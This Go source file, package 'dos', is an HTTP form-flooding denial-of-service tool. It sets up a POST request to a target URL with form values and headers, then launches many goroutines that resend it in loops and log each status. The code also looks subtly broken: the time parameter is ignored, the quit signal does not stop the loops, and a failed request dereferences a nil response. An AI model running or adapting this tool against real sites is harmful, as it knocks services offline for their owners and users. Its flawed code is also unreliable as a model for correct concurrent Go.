// Author: PiereLucas

package dos

import (
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"strings"
	"time"
)

type ch struct {
	starter chan struct{}
	quitter chan struct{}
	sync    chan int
}

// TargetInf - struct for webaddress and formnames
type TargetInf struct {
	webaddress string
	formnames  url.Values
	headers    map[string]string
}

var (
	channelStruct ch
	infoIntern    TargetInf
	hc            http.Client
	req           *http.Request
)

// AddWebaddress - Add webaddress to TargetInf.webaddress
func (inf *TargetInf) AddWebaddress(webAddress string) string {
	inf.webaddress = webAddress
	return inf.webaddress
}

// AddForm - Add formname to TargetInf.formnames
func (inf *TargetInf) AddForm(formName string, formValue string) url.Values {
	if inf.formnames == nil {
		_ = inf.MakeForms()
	}
	inf.formnames.Add(formName, formValue)
	return inf.formnames
}

// AddHeader - Add header to TargetInf.headers
func (inf *TargetInf) AddHeader(key string, value string) map[string]string {
	if inf.headers == nil {
		_ = inf.MakeHeaders()
	}
	inf.headers[key] = value
	return inf.headers
}

// MakeForms - initialize the internal Values struct.
// This function is process using TargetInf.AddForm
func (inf *TargetInf) MakeForms() url.Values {
	inf.formnames = url.Values{}
	return inf.formnames
}

// MakeHeaders - initialize the internal header map.
// This function is process using TargetInf.AddHeader
func (inf *TargetInf) MakeHeaders() map[string]string {
	inf.headers = make(map[string]string)
	return inf.headers
}

func makeRequest(sync chan<- uint8) {
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	resp, err := hc.Do(req)
	if err != nil {
		log.Printf("error do post request: %s\n", err)
	}

	defer func() {
		resp.Body.Close()                                                             // always close response.Body
		req.Body = ioutil.NopCloser(strings.NewReader(infoIntern.formnames.Encode())) // reset request.Body - initalize again with TargetInf.formnames
	}()

	if resp.StatusCode >= 200 && resp.StatusCode <= 299 {
		log.Printf("%10d | HTTP Status is in the 2xx range : %s\n", r.Uint32(), infoIntern.webaddress)
	} else {
		log.Printf("%10d | Argh! Broken : %s\n", r.Uint32(), infoIntern.webaddress)
	}

	sync <- 0
}

func runner() {
	<-channelStruct.starter // Starting routine on receive
	sync := make(chan uint8)
	for {
		select {
		case <-channelStruct.quitter: // Quit routine on receive
			break
		default:
			go makeRequest(sync)
			_ = <-sync
		}
	}
}

func start(n int) {
	for i := 1; i < n+1; i++ {
		log.Printf("Starting routine: %d\n", i)
		go runner()
	}
	close(channelStruct.starter)
	status := 0
	channelStruct.sync <- status
}

func quit() {
	close(channelStruct.quitter)
	time.Sleep(5 * time.Second)
	status := 0
	channelStruct.sync <- status
}

func buildingDataAndCh(info TargetInf) {
	channelStruct.starter = make(chan struct{})
	channelStruct.quitter = make(chan struct{})
	channelStruct.sync = make(chan int)

	infoIntern = info // Build global struct

	hc = http.Client{} // initialize http.Client struct

	// Building initial request and add values to request
	func() {
		var err error
		if req, err = http.NewRequest("POST", infoIntern.webaddress, strings.NewReader(infoIntern.formnames.Encode())); err != nil {
			log.Fatalln("error building request")
		}
		req.PostForm = infoIntern.formnames // add url.Values tu request

		// add headers to request
		for key, value := range infoIntern.headers {
			req.Header.Set(key, value)
		}
	}()
}

// Run function - returns error or nil
func Run(threads int, timeInSeconds int, info TargetInf) (err error) {
	var status int            // Status variable for error management
	var runTime time.Duration // variable for runtime management

	runTime = 8 * time.Second

	buildingDataAndCh(info) // build the datastructure from TargetInf struct and initialize channels

	go start(threads)             // start routines
	status = <-channelStruct.sync // Wait for start routine
	if status < 0 {
		err = fmt.Errorf("error in start() routine of package formdos")
		return err
	}

	time.Sleep(runTime) // Let the routines work for the given duration

	go quit()                     // quit routines
	status = <-channelStruct.sync // Wait for quit routine
	if status < 0 {
		err = fmt.Errorf("error in quit() routine of package formdos")
		return err
	}

	return nil

}
